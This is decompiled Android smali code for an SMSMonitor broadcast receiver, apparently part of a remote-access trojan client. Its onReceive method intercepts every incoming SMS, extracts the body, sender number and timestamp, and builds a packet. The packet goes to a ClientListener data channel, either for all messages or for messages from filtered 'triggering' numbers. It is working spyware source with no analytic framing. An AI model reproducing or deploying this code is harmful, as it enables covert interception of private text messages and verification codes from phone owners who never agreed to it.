.class Lmy/app/Library/SMSMonitor$1;
.super Landroid/content/BroadcastReceiver;
.source "SMSMonitor.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lmy/app/Library/SMSMonitor;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field private final SMS_RECEIVED:Ljava/lang/String;

.field final synthetic this$0:Lmy/app/Library/SMSMonitor;


# direct methods
.method constructor <init>(Lmy/app/Library/SMSMonitor;)V
    .locals 1
    .parameter

    .prologue
    .line 1
    iput-object p1, p0, Lmy/app/Library/SMSMonitor$1;->this$0:Lmy/app/Library/SMSMonitor;

    .line 57
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 59
    const-string v0, "android.provider.Telephony.SMS_RECEIVED"

    iput-object v0, p0, Lmy/app/Library/SMSMonitor$1;->SMS_RECEIVED:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 12
    .parameter "context"
    .parameter "intent"

    .prologue
    const/4 v11, 0x0

    .line 64
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v9

    const-string v10, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_0

    .line 65
    const-string v9, "SMSReceived"

    const-string v10, "onReceive sms !"

    invoke-static {v9, v10}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 67
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .line 68
    .local v0, bundle:Landroid/os/Bundle;
    if-eqz v0, :cond_0

    .line 69
    const-string v9, "pdus"

    invoke-virtual {v0, v9}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, [Ljava/lang/Object;

    .line 71
    .local v6, pdus:[Ljava/lang/Object;
    array-length v9, v6

    new-array v5, v9, [Landroid/telephony/SmsMessage;

    .line 72
    .local v5, messages:[Landroid/telephony/SmsMessage;
    const/4 v3, 0x0

    .local v3, i:I
    :goto_0
    array-length v9, v6

    if-lt v3, v9, :cond_1

    .line 75
    array-length v9, v5

    const/4 v10, -0x1

    if-le v9, v10, :cond_0

    .line 77
    aget-object v9, v5, v11

    invoke-virtual {v9}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v4

    .line 78
    .local v4, messageBody:Ljava/lang/String;
    aget-object v9, v5, v11

    invoke-virtual {v9}, Landroid/telephony/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;

    move-result-object v7

    .line 79
    .local v7, phoneNumber:Ljava/lang/String;
    aget-object v9, v5, v11

    invoke-virtual {v9}, Landroid/telephony/SmsMessage;->getTimestampMillis()J

    move-result-wide v1

    .line 81
    .local v1, date:J
    iget-object v9, p0, Lmy/app/Library/SMSMonitor$1;->this$0:Lmy/app/Library/SMSMonitor;

    iget-object v9, v9, Lmy/app/Library/SMSMonitor;->phoneNumberFilter:Ljava/util/HashSet;

    if-nez v9, :cond_2

    .line 82
    new-instance v8, LPacket/ShortSMSPacket;

    invoke-direct {v8, v7, v1, v2, v4}, LPacket/ShortSMSPacket;-><init>(Ljava/lang/String;JLjava/lang/String;)V

    .line 83
    .local v8, sms:LPacket/ShortSMSPacket;
    iget-object v9, p0, Lmy/app/Library/SMSMonitor$1;->this$0:Lmy/app/Library/SMSMonitor;

    iget-object v9, v9, Lmy/app/Library/SMSMonitor;->ctx:Lmy/app/client/ClientListener;

    iget-object v10, p0, Lmy/app/Library/SMSMonitor$1;->this$0:Lmy/app/Library/SMSMonitor;

    iget v10, v10, Lmy/app/Library/SMSMonitor;->channel:I

    invoke-virtual {v8}, LPacket/ShortSMSPacket;->build()[B

    move-result-object v11

    invoke-virtual {v9, v10, v11}, Lmy/app/client/ClientListener;->handleData(I[B)V

    .line 95
    .end local v0           #bundle:Landroid/os/Bundle;
    .end local v1           #date:J
    .end local v3           #i:I
    .end local v4           #messageBody:Ljava/lang/String;
    .end local v5           #messages:[Landroid/telephony/SmsMessage;
    .end local v6           #pdus:[Ljava/lang/Object;
    .end local v7           #phoneNumber:Ljava/lang/String;
    .end local v8           #sms:LPacket/ShortSMSPacket;
    :cond_0
    :goto_1
    return-void

    .line 73
    .restart local v0       #bundle:Landroid/os/Bundle;
    .restart local v3       #i:I
    .restart local v5       #messages:[Landroid/telephony/SmsMessage;
    .restart local v6       #pdus:[Ljava/lang/Object;
    :cond_1
    aget-object v9, v6, v3

    check-cast v9, [B

    invoke-static {v9}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v9

    aput-object v9, v5, v3

    .line 72
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 86
    .restart local v1       #date:J
    .restart local v4       #messageBody:Ljava/lang/String;
    .restart local v7       #phoneNumber:Ljava/lang/String;
    :cond_2
    iget-object v9, p0, Lmy/app/Library/SMSMonitor$1;->this$0:Lmy/app/Library/SMSMonitor;

    iget-object v9, v9, Lmy/app/Library/SMSMonitor;->phoneNumberFilter:Ljava/util/HashSet;

    invoke-virtual {v9, v7}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_0

    .line 87
    const-string v9, "SMSReceived"

    const-string v10, "Message accepted as triggering message !"

    invoke-static {v9, v10}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 88
    new-instance v8, LPacket/ShortSMSPacket;

    invoke-direct {v8, v7, v1, v2, v4}, LPacket/ShortSMSPacket;-><init>(Ljava/lang/String;JLjava/lang/String;)V

    .line 89
    .restart local v8       #sms:LPacket/ShortSMSPacket;
    iget-object v9, p0, Lmy/app/Library/SMSMonitor$1;->this$0:Lmy/app/Library/SMSMonitor;

    iget-object v9, v9, Lmy/app/Library/SMSMonitor;->ctx:Lmy/app/client/ClientListener;

    iget-object v10, p0, Lmy/app/Library/SMSMonitor$1;->this$0:Lmy/app/Library/SMSMonitor;

    iget v10, v10, Lmy/app/Library/SMSMonitor;->channel:I

    invoke-virtual {v8}, LPacket/ShortSMSPacket;->build()[B

    move-result-object v11

    invoke-virtual {v9, v10, v11}, Lmy/app/client/ClientListener;->handleData(I[B)V

    goto :goto_1
.end method
